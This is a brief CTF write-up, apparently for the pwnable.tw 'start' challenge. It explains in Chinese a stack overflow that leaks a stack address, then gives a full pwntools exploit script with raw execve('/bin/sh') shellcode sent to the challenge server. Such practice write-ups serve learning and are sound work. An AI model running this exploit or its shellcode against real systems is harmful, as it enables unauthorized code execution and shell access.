# poc

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```

> 栈溢出 -> 泄漏栈地址 -> 将shellcode写在栈上 -> 执行`execve('/bin/sh\x00',0,0)`

由于栈可执行，考虑将shellcode写在栈上，栈溢出调用`write`输出程序一开始`push esp`的值获得栈地址，从而执行栈上shellcode。

# exp

```python
from pwn import *

DEBUG = 0

if DEBUG:
    context(log_level = 'debug')
    p = process('./start.dms')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10000)

p.recvuntil('CTF:')

payload = 'a' * 0x14        # pad
payload += p32(0x8048087)   # write - read - ret

p.send(payload)

addr = u32(p.recv(0x14)[:4])

payload = 'a' * 0x14        #pad
payload += p32(addr - 0x4 + 0x14 + 0x4)
payload += '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.sendline(payload)

p.interactive()
```

